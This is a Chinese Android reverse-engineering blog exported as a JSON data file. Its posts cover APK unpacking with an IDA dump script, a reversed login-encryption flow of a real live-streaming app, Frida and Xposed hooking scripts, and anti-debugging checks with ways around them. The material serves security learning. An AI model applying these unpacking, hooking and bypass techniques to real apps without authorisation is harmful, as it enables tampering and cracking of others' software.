{"meta":{"title":"Bin Fantasy🤯","subtitle":"You may found nothing here.","description":"","author":"Ash3n On3","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2021-03-26T11:38:47.562Z","updated":"2021-03-26T11:38:47.562Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"地球OL游戏生涯 2021 继续学Android，希望找到实习。 2020 与全球玩家一起打高难度副本😷，十分壮烈。继续学pwn，开始钻heap。开始学安卓逆向，转职移动安全。 2019 学习pwn和re ，入门二进制。建立博客但啥也没写，老划水怪。 2018 通关新手教程。刷oj入门计算机。 Before 2000 ​ 注册地球OL，账号：@$!F@1#!$。"},{"title":"Tags","date":"2021-03-23T11:22:39.430Z","updated":"2020-10-03T09:03:26.452Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-10-03T09:03:26.452Z","updated":"2020-10-03T09:03:26.452Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2021-03-26T11:44:14.901Z","updated":"2021-03-26T11:44:14.901Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"地球OL队友们","text":"地球OL队友们"}],"posts":[{"title":"Apk加固","slug":"APP加固与加壳","date":"2021-04-09T09:00:27.000Z","updated":"2021-04-10T09:13:04.012Z","comments":true,"path":"2021/04/09/APP加固与加壳/","link":"","permalink":"http://example.com/2021/04/09/APP%E5%8A%A0%E5%9B%BA%E4%B8%8E%E5%8A%A0%E5%A3%B3/","excerpt":"","text":"加固原理​ APK保护措施指的是使逆向工作者获取源代码后不便分析或是获取apk后不便调试，而APK的加固则是避免对方直接获取到程序的可执行文件。 ​ 其原理是在Android项目将要打包发布时，再将加解密程序(壳程序)封装入dex文件中，在程序运行之前原dex文件由解密程序解出后再正常执行。而Cracker拿到apk后如果不做脱壳处理，则无法直接获得dex或者so原文件，也就不能直接分析源码。 加固后的Dex文件加载方式落地式加载​ 设备启动APP前先执行解壳程序，将加密后的dex文件加载到内存中进行解密，解密之后的完整Dex文件会临时保存在系统某一个目录下，再通过DexClassLoad去加载解密后的dex文件，运行程序。 ​ 对于这种加载方式，可以在程序运行时找到完整dex并复制出来进行分析。 不落地式加载（动态加载）​ 设备启动APP前先执行解壳程序，负责加载加密后的dex文件到内存中进行解密，解密之后的dex文件存放在内存中，通过自定义ClassLoad加载内存中的dex文件数据。 ​ 对于这种加载方式，可以在程序运行时在内存中找到dex文件头后，dump出dex文件。某些时候dex文件在内存中可能并非连续存放，因此可能需要根据偏移拼接各个片段形成完整dex。 加壳技术历史 常用脱壳机 Dex其他保护 字段隐藏​ 使用010Editor工具打开一个dex文件，再打开dex.bt(自动分析脚本)按下F5执行，选择需要分析的dex文件后，发现dex文件窗口下多出了分析窗口。 ​ 其中struct string_id_list_dex_type_ids存放一个结构体数组，每个结构体记录dex中各个类的信息。 ​ 其中uint class_data_off记录的是该类在dex文件中的偏移量。 ​ 将其值改为0，可以隐藏类的方法，反编译是看到的此类就是空的类。 指令集隐藏​ 用上述方式找到结构体数组class def item class_ def，找到Mainactivity的结构体，按照如下路径找到onCreat方法的指令集。 再将insns指令集数组置空。 用jadx打开则无法看到onCreat函数的函数体。 So层加固​ 由于so文件的安全性比dex高，因此开发者更倾向于将比较重要的算法和协议写入so层，即可增加apk逆向难度。 加壳自解​ 早期的爱加密对so层的加固就是将原有的so层通过类UPX的方式加壳之后再写入自己的libexec.so中。在需要调用app原有的so时候先进行解密，再使用libexec.so中自定义的linker加载到内存中。因此静态分析时只能看到被加密过的so。 ​ 这种保护一般只需要在运行时dum出内存中的so文件即可，但是so文件可能并不连续，需要修改elf文件的一些偏移。 字符串混淆​ 早期爱加密也用过类似ollvm的混淆技术。将部分字符串加密后储存在so层，运行时进行解密。 ​ 该混淆技术的解法： ​ 1.找到被加密的so文件，丢进010 Editor中找到被加密的字符串部分。 ​ 2.用IDA动态调试，在JNI_onload、init、init_array函数下断，搜索此时有无引进上述so模块。 ​ 3.找到so模块后再根据偏移找到被加密的字符串部分，用脚本dump出。 ​ 4.将dump出的文件覆写到so文件被加密的部分。 ​ 贴一个dump脚本： 123456789static main(void)&#123; auto fp,dexAdderss,end,size; start &#x3D; 0x0417D000; end &#x3D; 0x0417F000; fp &#x3D; fopen(&quot;D:\\\\libnet_ cry.so&quot;,&quot;wb&quot;); for( ; start &lt; end ; start++) fputc (Byte(start),fp);&#125; 代码混淆​ 利用宏定义，修改程序中的各个标识符名称，降低分析时的可读性。 修改文件结构​ 通过修改一些header，比如将某个函数的的地址偏移量置为0，此后若通过IDA等分析软件打开则无法正常反编译。不过只要重新计算出偏移值即可破解。","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"App登录逻辑分析","slug":"App登录逻辑","date":"2021-03-28T12:49:47.000Z","updated":"2021-04-07T01:13:47.765Z","comments":true,"path":"2021/03/28/App登录逻辑/","link":"","permalink":"http://example.com/2021/03/28/App%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91/","excerpt":"人人直播app的登录过程。","text":"人人直播app的登录过程。 之所以选择这app是因为没有加壳，而且混淆之后的代码还算比较好看，目前app现在还在运营中。人人直播的版本是v9.10.0，这也是博文撰写时该app的最新版本。 登录过程抓包设备安装好app之后打开登录界面，随意输入账号密码尝试登录。 获得提示”账号或密码输入有误，请重新输入”。这时候可以将apk丢到Android Killer分析，在strings.xml中搜索上述Toast文本。不过本文介绍抓包分析的方法： 在PC端安装Fiddler，设置好端口号之后导出证书。 确保电脑和手机在同一个互联网下之后，在手机中进入设置，对wifi设置代理，主机号参见PC的ip地址。完成设置后安装上述证书。 打开Fiddler发现抓到了不少http/https的包 此时打开客户端，输入账号密码，点击登录，再查看Fiddler，发现有一个特殊的包 查看报文。 由此可以分析，app在手机端将账号密码加密后拼接成报文发送到服务器 找到函数调用栈根据上面的报文，在Android Killer中搜索比较不常见的字段，这里选的是tab_sequence字段。 发现整个工程中仅有com.renren.mobile.android.service.ServiceProvider.Ya()函数使用了该字段。为了方便找到程序登录过程中的函数调用栈，可以对此函数进行方法分析： 打开DDMS，选中人人直播的进程，之后在手机上打开登录界面并提前输好账号密码。 点击方法分析，方法限制数为1000(默认)，点击ok。 迅速在app中点击登录，在马上回到DDMS中停止方法分析。 弹出方法分析窗口。 在方法分析窗口中找到Ya()函数，双击后可在parents中找到上层调用函数。 以此类推，可以得到如下的函数调用栈。 1234567android.view.view.performClick()👇调用com.renren.mobile.android.loginB.register.ui.LoginFromQuickRegisterFragment.onClick()👇调用com.renren.mobile.android.loginB.register.ui.LoginFromQuickRegisterFragment.j1()👇调用com.renren.mobile.android.service.ServiceProvider.Ya() 由于performClick再往上是系统级的进程，于是不再向上追溯。 方法分析使用Jadx-gui根据函数调用栈逐个分析方法。 ServiceProvider.Ya()此函数用于拼接各个字段并发往服务端。 12345678910111213141516171819202122232425public static void m8161Ya(String str, String str2, int i, String str3, String str4, Context context, LoginStatusListener loginStatusListener) &#123; JsonObject mb = m7924mb(false); if (str4 != null) &#123; mb.put(&quot;rkey&quot;, str4); &#125; mb.put(&quot;v&quot;, &quot;1.0&quot;); mb.put(&quot;format&quot;, &quot;JSON&quot;); mb.put(&quot;user&quot;, str); mb.put(&quot;password&quot;, str2); mb.put(&quot;uniq_id&quot;, Variables.f12082X); mb.m6432f(&quot;session_key&quot;); mb.put(INetRequest.f12253n, INetRequest.f12254o); mb.put(&quot;tab_sequence&quot;, 1L); JsonObject jsonObject = new JsonObject(); jsonObject.put(&quot;station_id&quot;, Variables.f12072S); mb.put(&quot;ext_info&quot;, jsonObject); mb.put(&quot;sig&quot;, m8499D8(mb)); INetResponse r4 = new 2(loginStatusListener, str, str2, context); HttpRequestWrapper httpRequestWrapper = new HttpRequestWrapper(); httpRequestWrapper.setUrl(ConstantUrls.k + &quot;/client/login&quot;); httpRequestWrapper.setData(mb); httpRequestWrapper.setResponse(r4); httpRequestWrapper.setSecretKey(f11721O); HttpProviderWrapper.getInstance().addRequest(httpRequestWrapper); &#125; 其中的user和password字段的值由调用函数传入。 LoginFromQuickRegisterFragment.j1()发现密码通过RSA类的函数加密。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374/* j1重命名为new_ser */private void new_ser()&#123; String str; SettingManager.g0().ra(&quot;&quot;); SettingManager.g0().sa(-1); //在RSA中启动新线程，该线程初始化各个属性，详见RSA.java RSA.g(); m6206f1(); //获取账号输入框的字符串 Variables.v = this.f18480x.getText().toString().trim(); //获取密码输入框的字符串 Variables.w = this.f18479w.getText().toString().trim(); String account = Variables.v; if (account == null || account.length() == 0) &#123; //提示：账号不能为空 Toast.makeText((Context) getActivity(), (CharSequence) RenrenApplication.getContext().getResources().getString(C0667R.string.v5_0_1_guide_register_account_no_null), 1).show(); return; &#125; String pwd = Variables.w; if (pwd == null || pwd.length() == 0) &#123; //提示：密码不能为空 Toast.makeText((Context) getActivity(), (CharSequence) RenrenApplication.getContext().getResources().getString(C0667R.string.v5_0_1_guide_register_password_no_null), 1).show(); &#125; else if (Methods.U0(Variables.v)) &#123; //提示：账号不能有中文字符 Methods.showToast(getResources().getString(C0667R.string.v5_0_1_guide_register_not_have_china), false); &#125; else if (Methods.U0(Variables.w)) &#123; //提示：密码不能有中文字符 Methods.showToast(getResources().getString(C0667R.string.v5_0_1_guide_register_pwd_have_china), false); &#125; else &#123; //如果上述检查无异常，就用RSA类的方法初始化变量。 rkey = RSA.get_rkey(); this.n = RSA.get_n(); String tmp_e = RSA.get_e(); this.e = tmp_e; if (rkey != null) &#123; try &#123; //密码用RSA.b()函数处理过 Variables.w = RSA.b(Variables.w, this.n, tmp_e); RSA.isDone = 1; &#125; catch (Exception e2) &#123; e2.printStackTrace(); &#125; &#125; else &#123; Variables.w = Md5.toMD5(Variables.w); RSA.isDone = 2; &#125; String str2 = Variables.v; //如果账号密码长度正确 if (str2 != null &amp;&amp; str2.length() &gt; 0 &amp;&amp; (str = Variables.w) != null &amp;&amp; str.length() &gt; 0) &#123; if (this.f18462G == null) &#123; Dialog dialog = new Dialog(getActivity()); this.f18462G = dialog; dialog.setContentView(C0667R.layout.login_dialog); ((ImageView) this.f18462G.findViewById(2131299173)).startAnimation(AnimationUtils.loadAnimation(getActivity(), C0667R.anim.login_dialog_scale)); &#125; this.f18462G.show(); if (RSA.isDone != 1) &#123; rkey = null; &#125; //调用Ya()，发现第一第二个函数分别为账号密码 ServiceProvider.Ya(Variables.v, Variables.w, 1, &quot;&quot;, rkey, getActivity(), this.f18471P); &#125; &#125;&#125; LoginFromQuickRegisterFragment.onClick()仅调用，无重要逻辑。 123456789101112public void onClick(View view) &#123; //switch判断被点击的Button switch (view.getId()) &#123; ... case 2131301366: //如果用户点击登录，则调用new_ser new_ser(); return; ... &#125; &#125; RSA.javaRSA的加密工具类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.renren.mobile.utils;import com.xiaomi.mipush.sdk.Constants;import java.io.BufferedReader;import java.io.InputStreamReader;import java.math.BigInteger;import java.net.URL;import java.security.KeyFactory;import java.security.interfaces.RSAPublicKey;import java.security.spec.InvalidKeySpecException;import java.security.spec.RSAPublicKeySpec;import javax.crypto.Cipher;import kotlin.UByte;public final class RSA &#123; public static String rkey; public static String e; public static String n; private static String info_from_url; public static int done; private static String a(byte[] bArr) &#123; StringBuilder sb = new StringBuilder(); for (byte b : bArr) &#123; sb.append(Integer.toString((b &amp; UByte.f22619c) + 256, 16).substring(1)); &#125; return sb.toString(); &#125; //用户输入密码由此函数加密，后两个参数本质上是服务器端传回的n和e的值 public static String b(String pwd, String ee, String dd) throws Exception &#123; Cipher instance = Cipher.getInstance(&quot;RSA&quot;); instance.init(1, c(ee, dd)); return a(instance.doFinal(pwd.getBytes())); &#125; private static RSAPublicKey c(String str, String str2) throws Exception &#123; try &#123; return (RSAPublicKey) KeyFactory.getInstance(&quot;RSA&quot;).generatePublic(new RSAPublicKeySpec(new BigInteger(str, 16), new BigInteger(str2, 16))); &#125; catch (InvalidKeySpecException e2) &#123; throw new Exception(e2.getMessage()); &#125; &#125; public static String d() &#123; return e; &#125; public static String e() &#123; return n; &#125; public static String f() &#123; return rkey; &#125; public static void g() &#123; //启动新线程，其任务是调用init_from_url()，故在new_ser中RSA.g()直接实现了类属性的初始化 new Thread(RunnableC0828a.f7137a).start(); &#125; static void init_from_url() &#123; try &#123; //返回url的内容 String i = i(); info_from_url = i; if (i != null) &#123; //根据info_from_url字符串初始化e、n、rkey e = i.split(Constants.COLON_SEPARATOR)[2].split(Constants.ACCEPT_TIME_SEPARATOR_SP)[0].trim(); n = info_from_url.split(Constants.COLON_SEPARATOR)[3].split(Constants.ACCEPT_TIME_SEPARATOR_SP)[0].trim(); rkey = info_from_url.split(Constants.COLON_SEPARATOR)[5].split(&quot;\\\\&#125;&quot;)[0].trim(); //去掉双引号 e = e.substring(1, e.length() - 1); n = n.substring(1, n.length() - 1); rkey = rkey.substring(1, rkey.length() - 1); &#125; &#125; catch (Exception e2) &#123; e2.printStackTrace(); &#125; &#125; private static String i() throws Exception &#123; //访问如下url，服务器会返回一串拼接了e、n、rkey的字符串，即服务器为客户端分配公钥 BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(&quot; http://login.renren.com/ajax/getEncryptKey&quot;).openStream(), &quot;GB2312&quot;)); String readLine = bufferedReader.readLine(); bufferedReader.close(); return readLine; &#125;&#125; 响应报文用户数据发往服务器之后，服务器会发会一个响应报文。 登录失败： 登录成功： 由于响应到客户端判断输出的过程设计太多网络编程🤣，没有太多涉猎，所以就不深究了，仅分析客户端输入到上传数据的过程。 总结 用户输入账户密码后，数据传入new_ser函数。 在判断输入格式无误后，新建RSA类并初始化。 RSA类新建线程，访问url，获取服务器分配的密钥。 RSA用分配的密钥以及其他字段信息初始化自身各个属性。 new_ser类传入用户输入的密码以及url中的n和e给RSA类中的b()函数作为参数。 密码加密完成 new_ser将账号密码以及rkey传入Ya函数。 Ya函数进行拼接发送。 服务器判断账号密码是否正确，根据结果返回不同响应。 抓包补充对于某些APP(特别是大厂)按照老方法抓包，发现登录的报文没办法抓到。 原因是为了保护数据安全，大部分app在传输敏感用户信息的数据包时并不会按照系统代理设置传输，也就是说这些流量包根本没有走代理通道。原理参见链接。 上述链接的最后提到了该问题的解决方法，即使用drony app对特定的应用进行指定代理。 再次测试，发现抓到了登录请求：","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"}]},{"title":"Hook Framework","slug":"Hook框架","date":"2021-03-15T09:11:28.000Z","updated":"2021-03-26T01:05:41.563Z","comments":true,"path":"2021/03/15/Hook框架/","link":"","permalink":"http://example.com/2021/03/15/Hook%E6%A1%86%E6%9E%B6/","excerpt":"截获消息，获得控制权。","text":"截获消息，获得控制权。 HOOK框架是一种Android逆向技术。在系统没有调用该函数之前，Hook就先捕获该消息，Hook函数先得到控制权，这时Hook函数既可以修改程序执行逻辑，改变参数返回值，还可以强制结束消息的传递。本文介绍常用的两种。 FridaFrida是基于JavaScript和python的，可以实现对android程序进行动态调试的工具包，可以用于下列用途： 访问进程的内存 应用程序运行时覆盖功能 从导入的类调用函数 动态Hook跟踪、拦截函数 在堆上查找对象实例并使用这些对象实例 Frida的本质是给二进制文件插桩，用安卓应用举例：在手机上运行frida_server并且转发端口到PC端，PC端又利用python代码与server进行通信，并用JavaScript对于正在执行的进程进行注入，达到内存访问的目的。如图： 本文对示例的两个apk分别进行java层和native层的hook调试。 Java层1.手机端环境配置 下载frida_server并push至手机中 adb shell中运行，并转发端口(默认端口为27042) 1adb forward tcp:27042 tcp:27042 2.Java 代码分析demo中需要分析的代码段如下。 123456789101112131415161718192021222324252627282930//In MainActivity:public void onClick(View arg6) &#123; switch(arg6.getId()) &#123; //Button 1 case 2131230720: &#123; Toast.makeText(this.getApplication(), new StringBuilder(String.valueOf(Utils.getCalc(2000, 5000))).toString(), 1).show(); break; &#125; //Button 2 case 2131230721: &#123; Toast.makeText(this.getApplication(), Utils.getMoney().getInfo(), 1).show(); break; &#125; //Button 3 case 2131230722: &#123; Toast.makeText(this.getApplication(), Utils.test(0x7CB8), 1).show(); break; &#125; //Button 4 case 2131230723: &#123; Toast.makeText(this.getApplication(), Utils.test(), 1).show(); break; &#125; //Button 5 case 2131230724: &#123; Toast.makeText(this.getApplication(), Utils.test(), 1).show(); break; &#125; &#125;&#125; 其中五个Button分别对应了如下五种函数类型。其Java代码及JavaScript注入脚本如下： Button 1:普通方法 123public static int getCalc(int arg1, int arg2) &#123; return arg1 + arg2;&#125; 👇 1234567891011121314151617Java.perform(function () &#123; //通过Java.use()找到需要hook的java类为变量初始化 var utils = Java.use(&#x27;com.frida.test.Utils&#x27;); //为util类中的getCalc方法编写hook脚本：参数为a,b utils.getCalc.implementation = function (a, b) &#123; //log方式输出 console.log(&quot;Hook Start...&quot;); //终端方式输出，分别输出Java层中给getCalc函数传入的两个参数 send(arguments[0]); send(arguments[1]); send(&quot;Success!&quot;); var num=arguments[0]+arguments[1]; send(&quot;返回值:&quot;); send(num); console.log(this.getCalc(arguments[0],arguments[1])); &#125;&#125;); Button 2:构造方法 12345public Money(int arg1, String arg2) &#123; super(); this.num = arg1; this.name = arg2;&#125; 👇 123456789101112Java.perform(function () &#123; var money = Java.use(&#x27;com.frida.test.Money&#x27;); //&quot;$init&quot;表示money类的构造函数 money.$init.implementation = function (a, b) &#123; console.log(&quot;Hook Start...&quot;); send(arguments[0]); send(arguments[1]); send(&quot;Success!&quot;); //原传入参数为:100,&quot;RMB&quot; return this.$init(10000, &quot;Dollor&quot;); &#125;&#125;); Button 3:重载方法 1234567public static String test(int arg2) &#123; return &quot;Test string 2:&quot; + arg2;&#125;public static String test() &#123; return &quot;This is a test string&quot;;&#125; 👇 12345678910Java.perform(function () &#123; var utils = Java.use(&#x27;com.frida.test.Utils&#x27;); //绑定参数类型为(int)的test重载函数 utils.test.overload(&quot;int&quot;).implementation = function (a) &#123; console.log(&quot;Hook Start...&quot;); send(arguments[0]); send(&quot;Success!&quot;); return &quot;3.1415926&quot;; &#125;&#125;); Button4、5在java层中调用了相同的函数： 123public static String test() &#123; return &quot;This is a test string&quot;;&#125; 但是通过注入不同的Javascrip脚本实现如下的不同功能。 构造对象参数 12345678910111213Java.perform(function () &#123; //此处构造两个新对象 var utils = Java.use(&#x27;com.frida.test.Utils&#x27;); var money = Java.use(&#x27;com.frida.test.Money&#x27;); //test函数作为载体 utils.test.overload().implementation = function () &#123; send(&quot;Hook Start...&quot;); //劫持程序执行新对象的构造函数 var mon = money.$new(2000,&#x27;港币&#x27;); send(mon.getInfo()); return this.test(800); &#125;&#125;); 修改对象属性 12345678910111213141516171819Java.perform(function () &#123; var utils = Java.use(&#x27;com.frida.test.Utils&#x27;); var money = Java.use(&#x27;com.frida.test.Money&#x27;); var class = Java.use(&#x27;java.lang.Class&#x27;); utils.test.overload().implementation = function () &#123; send(&quot;Hook Start...&quot;); var mon = money.$new(200,&#x27;港币&#x27;); send(mon.getInfo()); //将变量绑定为money对象的num属性 var numid= Java.cast(mon.getClass(),class).getDeclaredField(&#x27;num&#x27;); //将变量设为可修改 numid.setAccessible(true); send(numid.get(mon)); //修改 numid.setInt(mon, 1000); send(mon.getInfo()); return this.test(800); &#125;&#125;); 上述JavaScript脚本均需要插入到python代码中以运行使用： 1234567891011121314jscode=&quot;&quot;&quot;此处插入js代码，用三引号包围&quot;&quot;&quot;def message(message, data): if message[&quot;type&quot;] == &#x27;send&#x27;: print(&quot;[*] &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;])) else: print(message)process = frida.get_remote_device().attach(&#x27;com.frida.test&#x27;)script= process.create_script(jscode)script.on(&quot;message&quot;, message)script.load()sys.stdin.read() Native层so层代码： 12345678910111213141516171819int __fastcall Java_com_example_fridaso_FridaSoDefine_FridaSo(int a1, int a2, int a3, int a4，int a5)&#123; switch(a5): case 1: return a4 + a3; break; case 1: return a3 - a4; break; case 1: return a4 * a3; break; case 1: return a3 / a4; break; default: return 0; break;&#125; Javascript脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//setImmediate包围，可防止超时报错setImmediate(function () &#123; send(&quot;start&quot;); //遍历模块找基址 Process.enumerateModules(&#123; onMatch: function (exp) &#123; if (exp.name == &#x27;libdemo.so&#x27;) &#123; send(&#x27;enumerateModules find&#x27;); send(exp.name + &quot;|&quot; + exp.base + &quot;|&quot; + exp.size + &quot;|&quot; + exp.path); send(exp); return &#x27;stop&#x27;; &#125; &#125;, onComplete: function () &#123; send(&#x27;enumerateModules stop&#x27;); &#125; &#125;); //hook导出函数 var exports = Module.enumerateExportsSync(&quot;libdemo.so&quot;); for(var i=0;i&lt;exports.length;i++)&#123; send(&quot;name:&quot;+exports[i].name+&quot; address:&quot;+exports[i].address); &#125; //通过模块名直接查找基址 var baseSOFile = Module.findBaseAddress(&quot;libdemo.so&quot;); //&quot;Interceptor.attach&quot;获取进程，此处若为thumb汇编则需要改成0x1270+1 Interceptor.attach(baseSOFile.add(0x00001270),&#123; onEnter: function(args) &#123; //参数1为JNIEnv * console.log(Memory.readCString(args[0])); //参数2为jclass console.log(Memory.readUtf16String(args[3])); console.log(args[2]); console.log(args[3]); console.log(args[4]); &#125;, onLeave: function(retval)&#123; &#125; &#125;); //通过包名类名函数名找到基址获取程序进程 Interceptor.attach(Module.findExportByName(&quot;libfridaso.so&quot;,&quot;Java_com_example_fridaso_FridaSoDefine_FridaSo&quot;),&#123; //onEnter在函数执行前执行，args是函参 onEnter: function(args) &#123; send(&quot;Hook start&quot;); send(&quot;args[2]=&quot; + args[2]); send(&quot;args[3]=&quot; + args[3]); &#125;, //onLeave在函数执行结束后执行，retval是返回值 onLeave: function(retval)&#123; send(&quot;return:&quot;+retval); retval.replace(0); //替换返回值 &#125; &#125;);&#125;); Xposed Framework原理简述Xposed框架通过安装模块来实现需要的功能。所谓模块是指一类特殊的app，此类app通过修改Zygote来实现一些设计内核以及高权限的功能，由Xposed管理。其中，Zygote是Android的内核，每个APP均由Zygote fork出的虚拟机来运行，而Xposed框架中的模块可以重写并替换Zygote的执行文件app_process，即可从一开始就修改整个进程。 详细原理参见链接。 使用过程手机端1.手机root后直接安装xpose installer ，需要注意android5.0以下和以上安装的是不同版本。 2.重启后提示安装完成 PC端1.在Android Studio中新建空白工程(No Activity)，将库文件拖入libs目录。 2.在Java项目的第一个包里新建class。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839package com.example.xp;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage; public class hook implements IXposedHookLoadPackage &#123; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable &#123; if(loadPackageParam.packageName.equals(&quot;包名&quot;))&#123; XposedHelpers.findAndHookMethod(&quot;包名.类名&quot;, loadPackageParam.classLoader, &quot;hook函数名&quot;, String.class, String.class, new XC_MethodHook() &#123; @Override //执行被hook函数前运行 protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; super.beforeHookedMethod(param); XposedBridge.log(&quot;Arg1: &quot; + param.args[0]); XposedBridge.log(&quot;Arg2: &quot; + param.args[1]); //XposedBridge.log(&quot;Arg3: &quot; + param.args[2]); //打印堆栈信息 StackTraceElement[] wodelogs = new Throwable(&quot;wodelog&quot;).getStackTrace(); for(int i=0;i&lt;wodelogs.length;i++)&#123; XposedBridge.log(&quot;查看堆栈:&quot;+wodelogs[i].toString()); &#125; &#125; @Override //执行被hook函数后运行(返回前) protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; super.afterHookedMethod(param); XposedBridge.log(&quot;Result before modified: &quot; + param); param.setResult(true); // 函数返回值修改为true &#125; &#125;); &#125; &#125;&#125; 3.创建assets文件夹，新建文件xposed_init，写入“包名+类名”，模块从此处寻找程序入口。 4.修改清单文件AndroidManifest.xml，在标签之间添加如下代码： 1234567891011121314&lt;!-- 添加标识 --&gt; &lt;meta-data android:name=&quot;xposedmodule&quot; android:value=&quot;true&quot;/&gt; &lt;!-- 载入Hook模块之后显示的信息 --&gt; &lt;meta-data android:name=&quot;xposeddescription&quot; android:value=&quot;Xposed Proxy For HOOK&quot;/&gt; &lt;!-- 规定jar包的版本信息 --&gt; &lt;meta-data android:name=&quot;xposedminversion&quot; android:value=&quot;54&quot;/&gt; 👇 5.修改build.gradle(app)，添加sourceSets段落，修改fileTree为compileOnly 6.构造运行，在虚拟机中查看，在installer中勾选模块 7.重启后在installer中查看日志，安装完成","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"Android Protection","slug":"Android Protection","date":"2021-03-08T04:27:03.000Z","updated":"2021-03-25T12:01:59.987Z","comments":true,"path":"2021/03/08/Android Protection/","link":"","permalink":"http://example.com/2021/03/08/Android%20Protection/","excerpt":"关于APK包的保护以及代码的反调试方法。","text":"关于APK包的保护以及代码的反调试方法。 APK保护Java代码混淆通常为了提高代码可读性，开发者会给各个标识赋予相应的意义，包名类名都会经过相应的命名。但是当程序被打包时，不需要考虑可读性，因为包名类名或者标识符只需要能准确寻址即可，于是开发者会对可执行文件的源代码进行混淆，这样可以一定程度的增加逆向过程中所需的时间。 低可读性可以劝退一部分逆向者，但是本质上来说，整个代码的逻辑并没有改变，因此并不能一劳永逸地解决代码保护的问题。 资源文件混淆类似代码混淆，降低资源id和资源文件名的可读性。 签名验证某些apk文件解压后，发现里面存在MANIFEST.MF文件，这就是apk的签名文件。 签名文件中保存着apk文件的信息摘要并进行了加密，如果通过逆向对apk进行重新打包，会使得签名文件与原文件不一致，无法通过签名校验。 签名验证方式很多，以下例子是被定义在native层的三个签名相关函数，人送爱称“签名三兄弟”。 123getPackageName()getPackageManage()getPackageInfo() 签名验证可以通过修改程序逻辑进行绕过，实际情况实际分析。 反调试关键文件检测遍历**/data/local/tmp路径，查找是否存在android_server，android_server64**这样的文件。如果存在则杀死当前进程。 调试端口检测一些调试器在调试安卓程序时会占用默认的端口，例如IDA使用的端口：23946。检验占用这些端口的进程即可轻易判断程序是否被调试。 但换成非默认端口即可绕过。 进程名称检测Android系统中(其实Linux也是)，每个进程运行时都会生成一个对应的文件夹，路径为**/proc/pid/，其目录下的status**文件用于记录进程状态。而status文件中的Tracerid字段，又用于记录当前进程的调试进程pid。 检测时只需读取此处的pid判断是否为空，如果不为空再查询此pid对应的是什么进程。如果是android_server这样的与调试相关进程，则直接杀死当前进程阻止调试。 1234567891011121314151617181920212223242526272829303132333435363738void coursecheck()&#123; const int bufsize = 1024; char filename[bufsize]; char line[bufsize]; char name[bufsize]; char nameline[bufsize]; int pid = getpid(); //先读取Tracepid的值 sprintf(filename, &quot;/proc/%d/status&quot;, pid); FILE *fd=fopen(filename,&quot;r&quot;); if(fd!=NULL) &#123; while(fgets(line,bufsize,fd)) &#123; if(strstr(line,&quot;TracerPid&quot;)!=NULL) &#123; int statue =atoi(&amp;line[10]); if(statue!=0) &#123; sprintf(name,&quot;/proc/%d/cmdline&quot;,statue); FILE *fdname=fopen(name,&quot;r&quot;); if(fdname!= NULL) &#123; while(fgets(nameline,bufsize,fdname)) &#123; if(strstr(nameline,&quot;android_server&quot;)!=NULL) &#123; int ret=kill(pid,SIGKILL); &#125; &#125; &#125; fclose(fdname); &#125; &#125; &#125; &#125; fclose(fd);&#125; 轮询检测循环检测当前进程状态文件，即 ，判断tracerid字段是否为0，若不为0则判定进程处于被debug状态，进而关闭进程。 Self-Debugging当前进程fork()得到子进程后，子进程对父进程进行debug，由于父进程被占用(进程同一时间只能被一个进程attach)，使得其他程序无法直接对父进程进行debug。 解决方法：通过debug子进程来间接debug父进程。 模拟器检测根据模拟器的特征，程序可以判断自身是否运行于模拟器中。特征值大致有下面这些： Device ID - 设备序列号 电话号码 IMSI识别码 运营商名称 QEMU相关的二进制文件 CPU信息 除此之外的模拟器检测方法还有很多。 Java层反调试0x00.Debug条件 apk中的AndroidMainfest.xml中，application标签下有该属性： 1Android:debuggable=true 设备可调试，即拥有如下属性： 1ro.debugable=1 该属性又位于boot.img镜像中的/default.prop文件中，前者在设备开机前由ramdisk 挂载。因此可以修改boot.img从而修改ro.debugable属性使得设备全局可调试。该项修改可通过Magisk及其模块MagiskHide Props Config实现。 0x01.isDebuggerConnected()Android SDK中的android.os.debug类提供了一个isDebuggerConnected方法，该方法用于判断JDWP调试器是否正在工作。 可通过修改smali代码进行绕过。 0x02.时间戳检测正常情况下程序运行时取两个时间戳，两者差值较小。但若是在debug状态下，时间差值会超出正常值，若排除程序卡顿已经bug的情况下可以断定app处于debug状态。Exp： 123456789101112131415jint anti_time()&#123; int pid = getpid(); struct timeval t1; struct timeval t2; struct timezone tz; gettimeofday(&amp;t1, &amp;tz); gettimeofday(&amp;t2, &amp;tz); int timeoff = (t2.tv_sec) - (t1.tv_sec); LOGD(&quot;time %d&quot;,timeoff); if (timeoff &gt; 1) &#123; int ret = kill(pid, SIGKILL); return 1; &#125; return 0;&#125; 